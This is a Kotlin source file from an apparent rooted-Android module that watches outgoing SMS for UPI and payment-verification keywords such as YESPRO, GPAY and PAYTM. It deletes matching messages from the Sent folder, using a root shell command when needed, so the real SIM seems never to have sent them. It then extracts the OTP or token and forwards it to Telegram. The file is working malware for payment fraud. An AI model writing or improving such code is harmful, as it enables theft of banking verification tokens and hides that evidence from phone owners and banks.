package com.hivirtus.zygiskmode

import android.content.Context
import android.provider.Telephony
import android.util.Log

/**
 * Google Messages Sent folder se YESPRO/UPI verify SMS hatao — real SIM se send nahi hua dikhe.
 */
object OutgoingSmsCleaner {

    private const val TAG = "OutgoingSmsCleaner"

    private val verifyKeywords = listOf(
        "YESPRO", "YESPROUPI", "YESPAY", "UPI", "VERIFY", "VK-", "PPAY", "GPAY", "PAYTM"
    )

    fun shouldScrub(body: String, config: ModuleConfig, dest: String = ""): Boolean {
        if (!config.hookOutgoingSms && !config.interceptFakeSuccess) return false
        if (ActiveHookManager.readActivePackage().isNullOrBlank()) return false
        if (dest.isNotBlank()) {
            return SmsMatcher.shouldInterceptOutgoing(config, dest, body)
        }
        val upper = body.uppercase()
        return verifyKeywords.any { upper.contains(it) }
    }

    fun scrubSentIfNeeded(context: Context, dest: String, body: String): Boolean {
        val config = ConfigManager(context).load()
        if (!shouldScrub(body, config, dest)) return false

        val deleted = deleteSent(context, dest, body)
        if (deleted) {
            Log.i(TAG, "Removed sent verify SMS to $dest")
            deliverToTelegram(context, config, dest, body)
        }
        return deleted
    }

    private fun deleteSent(context: Context, dest: String, body: String): Boolean {
        if (!PermissionHelper.hasReadSms(context)) return false
        return try {
            val n = context.contentResolver.delete(
                Telephony.Sms.CONTENT_URI,
                "${Telephony.Sms.ADDRESS}=? AND ${Telephony.Sms.BODY}=? AND ${Telephony.Sms.TYPE}=?",
                arrayOf(dest, body, Telephony.Sms.MESSAGE_TYPE_SENT.toString())
            )
            if (n > 0) {
                context.contentResolver.notifyChange(Telephony.Sms.CONTENT_URI, null)
                return true
            }
            deleteSentViaSu(dest, body)
        } catch (e: Exception) {
            Log.w(TAG, "Delete sent failed: ${e.message}")
            deleteSentViaSu(dest, body)
        }
    }

    private fun deleteSentViaSu(dest: String, body: String): Boolean {
        val safePeer = dest.replace("'", "'\\''")
        val safeBody = body.replace("'", "'\\''").replace("\n", " ")
        return ShellHelper.runSu(
            "content delete --uri content://sms/sent " +
                "--where \"address='$safePeer' AND body='$safeBody'\""
        )
    }

    private fun deliverToTelegram(context: Context, config: ModuleConfig, dest: String, body: String) {
        val configManager = ConfigManager(context)
        val app = SmsMatcher.matchedHookedApp(config, dest, body)
        val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
        val otp = LastOtp(
            otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
            sender = interceptDisplay,
            body = body,
            phone = interceptDisplay,
            messageLabel = app?.displayName.orEmpty(),
            direction = "outgoing",
            rawPeer = dest,
            capturedAt = System.currentTimeMillis()
        )
        OtpCaptureWriter.write(context, otp)
        if (config.autoForwardToken || config.fakeInterceptTelegram) {
            TokenForwarder(configManager, context).forward(otp)
        }
    }
}
